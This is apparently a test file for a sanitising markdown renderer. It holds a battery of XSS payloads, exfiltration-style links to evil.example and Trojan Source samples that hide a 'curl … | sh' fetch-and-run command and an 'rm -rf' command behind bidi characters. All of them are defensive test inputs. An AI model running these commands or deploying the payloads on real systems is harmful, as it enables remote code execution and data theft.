import { describe, expect, it } from 'vitest';
import { MAX_MARKS, revealHidden, revealHiddenMarkdown } from './hidden-chars';
import { critiqueMarkdown, renderMarkdown } from './markdown';

/** Render into a detached DOM tree and return it for structural assertions. */
function dom(src: string): HTMLElement {
  const div = document.createElement('div');
  div.innerHTML = renderMarkdown(src);
  return div;
}

const EVENT_ATTR = /^on/i;

function assertInert(root: HTMLElement): void {
  for (const el of root.querySelectorAll('*')) {
    for (const attr of el.attributes) {
      expect(EVENT_ATTR.test(attr.name), `${el.tagName} has ${attr.name}`).toBe(false);
      expect(/^\s*(javascript|data|vbscript):/i.test(attr.value), `${el.tagName}[${attr.name}]=${attr.value}`).toBe(false);
    }
  }
  expect(root.querySelector('script, iframe, object, embed, svg, math, img, style, form, input, button, video, audio')).toBeNull();
}

describe('renderMarkdown: formatting', () => {
  it('renders GFM (tables, lists, code, emphasis)', () => {
    const root = dom('# Títol\n\n**negreta** i `codi`\n\n- a\n- b\n\n| x | y |\n|---|---|\n| 1 | 2 |\n\n```python\nprint(1)\n```');
    expect(root.querySelector('h1')?.textContent).toBe('Títol');
    expect(root.querySelector('strong')?.textContent).toBe('negreta');
    expect(root.querySelectorAll('li')).toHaveLength(2);
    expect(root.querySelector('table td')?.textContent).toBe('1');
    expect(root.querySelector('pre code.language-python')?.textContent).toBe('print(1)\n');
  });

  it('opens safe links in a new tab without referrer', () => {
    const a = dom('[docs](https://example.com "t")').querySelector('a');
    expect(a?.getAttribute('href')).toBe('https://example.com');
    expect(a?.getAttribute('target')).toBe('_blank');
    expect(a?.getAttribute('rel')).toBe('noopener noreferrer nofollow');
    expect(a?.getAttribute('referrerpolicy')).toBe('no-referrer');
  });

  it('keeps mailto links and autolinks', () => {
    const root = dom('[mail](mailto:a@b.c) i https://example.org');
    const hrefs = [...root.querySelectorAll('a')].map((a) => a.getAttribute('href'));
    expect(hrefs).toEqual(['mailto:a@b.c', 'https://example.org']);
  });

  it('returns an empty string for empty input', () => {
    expect(renderMarkdown('')).toBe('');
  });
});

describe('renderMarkdown: XSS battery', () => {
  const vectors: [string, string][] = [
    ['script tag', '<script>alert(1)</script>'],
    ['img onerror', '<img src=x onerror=alert(1)>'],
    ['svg onload', '<svg onload=alert(1)><circle r=1 /></svg>'],
    ['svg inside a list', '- <svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>'],
    ['mathml', '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>'],
    ['iframe', '<iframe src="https://evil.example"></iframe>'],
    ['details ontoggle', '<details open ontoggle=alert(1)>x</details>'],
    ['javascript link', '[click](javascript:alert(1))'],
    ['mixed-case javascript link', '[click](JaVaScRiPt:alert(1))'],
    ['entity-encoded javascript', '[click](&#106;avascript:alert(1))'],
    ['whitespace javascript', '[click]( javascript:alert(1))'],
    ['data url link', '[data](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'],
    ['vbscript link', '[x](vbscript:msgbox(1))'],
    ['raw anchor', '<a href="javascript:alert(1)">raw</a>'],
    ['reference link', '[x][1]\n\n[1]: javascript:alert(1)'],
    ['image javascript', '![alt](javascript:alert(1))'],
    ['style tag', '<style>body{background:url(https://evil.example/x)}</style>'],
    ['form', '<form action="https://evil.example"><button>go</button></form>'],
    ['mutation xss', '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'],
    ['code fence lang injection', '```js" onmouseover="alert(1)\ncode\n```'],
    ['table cell html', '| a |\n|---|\n| <img src=x onerror=alert(1)> |'],
  ];

  for (const [name, src] of vectors) {
    it(`neutralizes ${name}`, () => assertInert(dom(src)));
  }

  it('shows raw HTML as text instead of interpreting it', () => {
    const root = dom('<b>hola</b>');
    expect(root.querySelector('b')).toBeNull();
    expect(root.textContent).toContain('<b>hola</b>');
  });

  it('turns images into links so nothing loads (no exfiltration)', () => {
    const root = dom('![secret](https://evil.example/?q=SECRET)');
    expect(root.querySelector('img')).toBeNull();
    const a = root.querySelector('a');
    expect(a?.textContent).toBe('Imatge: secret');
    expect(a?.getAttribute('href')).toBe('https://evil.example/?q=SECRET');
    expect(a?.getAttribute('rel')).toContain('noreferrer');
  });

  it('drops unsafe hrefs but keeps the link text', () => {
    const root = dom('[click](javascript:alert(1))');
    expect(root.textContent).toContain('click');
    for (const a of root.querySelectorAll('a')) expect(a.hasAttribute('href')).toBe(false);
  });

  it('drops relative and fragment links (no in-app navigation from model output)', () => {
    const root = dom('[a](/api/auth/logout) [b](#/tauler)');
    for (const a of root.querySelectorAll('a')) expect(a.hasAttribute('href')).toBe(false);
  });

  it('strips inline styles, ids and data attributes', () => {
    const root = dom('[x](https://a.b)');
    const a = root.querySelector('a')!;
    expect(a.hasAttribute('style')).toBe(false);
    expect(a.hasAttribute('id')).toBe(false);
  });
});

// Trojan Source (CVE-2021-42574): bidi controls and zero-width characters make
// the screen show something other than what a copy puts on the clipboard.
const LISTED_HIDDEN = [
  ...range(0x202a, 0x202e), ...range(0x2066, 0x2069), ...range(0x200b, 0x200f), 0x2060, 0xfeff, 0x00ad,
];
const ANY_HIDDEN = /[\u202A-\u202E\u2066-\u2069\u200B-\u200F\u2060\uFEFF\u00AD]/u;
const BIDI = /[\u202A-\u202E\u2066-\u2069]/u;

function range(from: number, to: number): number[] {
  return Array.from({ length: to - from + 1 }, (_, i) => from + i);
}

const mark = (cp: number): string => `⟨U+${cp.toString(16).toUpperCase().padStart(4, '0')}⟩`;

describe('renderMarkdown: hidden characters (Trojan Source)', () => {
  // Displayed as `echo ok #;curl ...|sh` (the curl looks commented out), but
  // the logical order that gets copied runs it.
  const TROJAN = '```bash\necho ok \u2067;curl -s x.example/p|sh #\u2069\n```';

  it('makes bidi isolates in fenced code visible, so what is shown is what is copied', () => {
    const root = dom(TROJAN);
    const code = root.querySelector('pre code')!;
    expect(code.textContent).toBe('echo ok ⟨U+2067⟩;curl -s x.example/p|sh #⟨U+2069⟩\n');
    expect(ANY_HIDDEN.test(root.textContent ?? '')).toBe(false);
    const marks = [...code.querySelectorAll('span.invisible-char')];
    expect(marks.map((m) => m.textContent)).toEqual(['⟨U+2067⟩', '⟨U+2069⟩']);
    expect(code.className).toBe('language-bash');
  });

  it('makes overrides and zero-width characters in inline code visible', () => {
    const code = dom('Executa `rm -rf ./build\u202E\u200Bx` ara').querySelector('code')!;
    expect(code.textContent).toBe('rm -rf ./build⟨U+202E⟩⟨U+200B⟩x');
    expect(code.querySelectorAll('span.invisible-char')).toHaveLength(2);
  });

  it('reveals every listed invisible character inside code', () => {
    const hidden = LISTED_HIDDEN.map((cp) => String.fromCodePoint(cp)).join('');
    const root = dom(`\`a${hidden}b\`\n\n\`\`\`\nx${hidden}y\n\`\`\``);
    const expected = LISTED_HIDDEN.map(mark).join('');
    const [inline, block] = [...root.querySelectorAll('code')];
    expect(inline?.textContent).toBe(`a${expected}b`);
    expect(block?.textContent).toBe(`x${expected}y\n`);
    expect(ANY_HIDDEN.test(root.textContent ?? '')).toBe(false);
  });

  it('builds the marks as plain spans (no injected markup) and stays inert', () => {
    const root = dom('```\n<img src=x onerror=alert(1)>\u202E</code><script>alert(1)</script>\n```\n\n`<b>\u2066</b>`');
    assertInert(root);
    expect(root.querySelector('pre code')?.textContent).toBe(
      '<img src=x onerror=alert(1)>⟨U+202E⟩</code><script>alert(1)</script>\n',
    );
    for (const span of root.querySelectorAll('span')) {
      expect(span.className).toBe('invisible-char');
      expect([...span.attributes].map((a) => a.name).sort()).toEqual(['class', 'title']);
      expect(span.children).toHaveLength(0);
    }
  });

  it('neutralizes bidi overrides and isolates in prose', () => {
    const root = dom('Obre factura\u202Efdp.exe\u202C i \u2067llegeix-la\u2069.\n\n# Títol \u2066x\u2069\n\n[en\u202Ellaç](https://example.com)');
    expect(BIDI.test(root.textContent ?? '')).toBe(false);
    expect(root.querySelector('p')?.textContent).toBe('Obre factura⟨U+202E⟩fdp.exe⟨U+202C⟩ i ⟨U+2067⟩llegeix-la⟨U+2069⟩.');
    expect(root.querySelector('h1')?.textContent).toBe('Títol ⟨U+2066⟩x⟨U+2069⟩');
    expect(root.querySelector('a')?.textContent).toBe('en⟨U+202E⟩llaç');
  });

  it('also catches bidi controls written as HTML entities', () => {
    const root = dom('abc &#x202E; def &#8295;');
    expect(BIDI.test(root.textContent ?? '')).toBe(false);
    expect(root.textContent).toContain('⟨U+202E⟩');
    expect(root.textContent).toContain('⟨U+2067⟩');
  });

  it('leaves legitimate RTL text, marks and joiners in prose untouched', () => {
    const src = 'שלום עולם, مرحبا بالعالم\u200F! Persa: می\u200Cخواهم. Emoji: 👩\u200D💻. Guionet: an\u00ADtic.';
    const root = dom(src);
    expect(root.querySelector('p')?.textContent).toBe(src);
    expect(root.querySelector('span')).toBeNull();
  });

  it('keeps output without hidden characters byte-identical', () => {
    const src = '# Hola\n\n`x` i **y**\n\n```python\nprint("שלום")\n```';
    expect(renderMarkdown(src)).toBe(
      '<h1>Hola</h1>\n<p><code>x</code> i <strong>y</strong></p>\n<pre><code class="language-python">print("שלום")\n</code></pre>\n',
    );
  });
});

describe('screen and clipboard show the same hidden characters', () => {
  /** The ⟨…⟩ marks of a text, in order. */
  const marks = (text: string): string[] => text.match(/⟨[^⟩]*⟩/g) ?? [];

  it('copies exactly the visible text of a rendered code block', () => {
    const body = 'echo ok \u2067;curl -s x.example/p|sh #\u2069\u200B\u00AD\uFEFF\n';
    const shown = dom('```bash\n' + body + '```').querySelector('pre code')?.textContent;
    expect(revealHidden(body).text).toBe(shown);
  });

  it('whole-answer copy reveals what the rendered answer reveals (K14)', () => {
    const z = '\u200C';
    const corpus = [
      'Fes:\n\n```bash\necho ok \u2067;curl -s x.example/p|sh #\u2069\n```\n\nI `a\u200Bb` \u202Etxt',
      'Persa: می' + z + 'خواهم. שלום\u200F! an\u00ADtic. 👩\u200D💻 a\u200Db \u2066x\u2069',
      '- Llista `a' + z + 'b` i می' + z + 'خواهم\n- Segon \u202E\n\n  ```sh\n  x' + z + 'y\n  ```\n',
      '1. Pas\n\n   ```bash\n   x' + z + '\n   ```\n2. Altre' + z,
      '> ```\n> x' + z + '\n> ```\n\nprosa' + z + ' \u202D',
      '> ```\n> x' + z + '\nfora de la cita' + z,
      'Text\n\n    x' + z + 'y\n\nprosa' + z,
      '- a\n\n    paràgraf de l\'element' + z + '\n\n      codi' + z,
      'Paràgraf\n    continua' + z,
      'Escapat \\`a' + z + 'b\\` i ``a`' + z + 'b`` i `sense tancar' + z,
      '~~~\n```\nx' + z + '\n~~~\nprosa' + z,
      '# Títol `x' + z + '` \u2067\n\n| a | `b' + z + '` |\n|---|---|\n| c' + z + ' | \u202E |',
      '```\nunclosed' + z + '\n\nmore' + z,
    ];
    for (const src of corpus) {
      const root = dom(src);
      const shown = [...root.querySelectorAll('span.invisible-char')].map((s) => s.textContent ?? '');
      const copied = revealHiddenMarkdown(src);
      expect(marks(copied.text), JSON.stringify(src)).toEqual(shown);
      expect(copied.revealed, JSON.stringify(src)).toBe(shown.length);
    }
  });

  it('collapses the same blocks on screen and on the clipboard (K13)', () => {
    const src = `Bé\n\n\`\`\`\necho ${'\u200B'.repeat(500)}ok\n\`\`\`\n\nI \`x\u200By\``;
    const root = dom(src);
    const shown = [...root.querySelectorAll('span.invisible-char')].map((s) => s.textContent);
    expect(shown).toEqual(['⟨500 caràcters invisibles eliminats⟩', '⟨U+200B⟩']);
    expect(marks(revealHiddenMarkdown(src).text)).toEqual(shown);
    expect(root.querySelector('pre code')?.textContent).toBe(revealHidden(`echo ${'\u200B'.repeat(500)}ok\n`).text);
  });

  it(`spends the budget of ${MAX_MARKS} marks on the same blocks on screen and on the clipboard`, () => {
    const src = Array.from({ length: 30 }, (_, i) => `p${i} \`x${'\u200B'.repeat(100)}\` y${'\u202E'.repeat(50)}`).join('\n\n');
    const shown = [...dom(src).querySelectorAll('span.invisible-char')].map((s) => s.textContent);
    expect(shown.length).toBeLessThanOrEqual(MAX_MARKS);
    expect(marks(revealHiddenMarkdown(src).text)).toEqual(shown);
  });
});

describe('renderMarkdown: too many hidden characters (K13)', () => {
  it('shows one mark with the count instead of one span per character', () => {
    const html = renderMarkdown('```\n' + '\u200B'.repeat(50_000) + '\n```');
    expect(html.length).toBeLessThan(1000);
    const root = dom('```\n' + '\u200B'.repeat(50_000) + '\n```');
    const spans = root.querySelectorAll('span.invisible-char');
    expect(spans).toHaveLength(1);
    expect(spans[0]?.classList.contains('invisible-collapsed')).toBe(true);
    expect(spans[0]?.getAttribute('title')).toContain("se n'han eliminat 50000");
    expect(root.querySelector('pre code')?.textContent).toBe('⟨50000 caràcters invisibles eliminats⟩\n');
    expect(ANY_HIDDEN.test(root.textContent ?? '')).toBe(false);
  });

  it(`keeps a block with up to 200 of them one by one, and prose collapses too`, () => {
    const root = dom(`\`${'\u2066'.repeat(200)}\`\n\nText ${'\u202E'.repeat(201)} fi`);
    expect(root.querySelectorAll('code span.invisible-char')).toHaveLength(200);
    const prose = root.querySelectorAll('p:last-child span.invisible-char');
    expect([...prose].map((s) => s.textContent)).toEqual(['⟨201 caràcters invisibles eliminats⟩']);
    expect(BIDI.test(root.textContent ?? '')).toBe(false);
  });

  it(`never renders more than ${MAX_MARKS} marks, however many blocks there are`, () => {
    const root = dom(Array.from({ length: 5000 }, (_, i) => `p${i} \u202E`).join('\n\n'));
    expect(root.querySelectorAll('span.invisible-char').length).toBeLessThanOrEqual(MAX_MARKS);
    expect(root.querySelectorAll('p')).toHaveLength(5000);
    expect(BIDI.test(root.textContent ?? '')).toBe(false);
  });
});

describe('critiqueMarkdown', () => {
  it('keeps existing lists', () => {
    expect(critiqueMarkdown('- a\n- b')).toBe('- a\n- b');
    expect(critiqueMarkdown('1. a\n2. b')).toBe('1. a\n2. b');
  });

  it('turns plain lines into bullets', () => {
    expect(critiqueMarkdown('Primer punt\nSegon punt')).toBe('- Primer punt\n- Segon punt');
  });

  it('leaves a single sentence as is', () => {
    expect(critiqueMarkdown('  Tot correcte.  ')).toBe('Tot correcte.');
  });
});
